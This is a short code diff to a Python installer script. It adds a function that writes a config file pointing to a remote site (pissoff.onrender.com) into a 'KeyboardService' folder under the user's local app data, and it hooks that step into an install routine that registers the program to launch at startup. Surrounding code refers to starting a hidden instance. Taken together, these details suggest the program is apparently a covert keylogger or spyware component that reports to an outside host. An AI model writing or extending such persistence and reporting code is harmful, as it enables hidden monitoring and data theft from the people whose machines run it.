@@ -1,3 +1,4 @@
+import json
 import os
 import subprocess
 import sys
@@ -23,6 +24,15 @@ def get_startup_command(site_url: str | None = None):
     exe_path = get_target_executable()
     target_url = (site_url or os.getenv("SITE_URL") or "https://pissoff.onrender.com").strip()
     return f'"{exe_path}" --site-url {target_url}'
+
+
+def write_config_file(site_url: str):
+    install_dir = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
+    os.makedirs(install_dir, exist_ok=True)
+    config_path = os.path.join(install_dir, "config.json")
+    with open(config_path, "w", encoding="utf-8") as config_file:
+        json.dump({"site_url": site_url.strip().rstrip("/")}, config_file, indent=2)
+    print(f"Config updated: {config_path}")
 
 
 def register_startup_launch():
@@ -65,6 +75,8 @@ def start_hidden_instance():
 
 def main():
     if len(sys.argv) > 1 and sys.argv[1].lower() == "install":
+        site_url = os.getenv("SITE_URL", "https://pissoff.onrender.com").strip().rstrip("/")
+        write_config_file(site_url)
         register_startup_launch()
         return
 
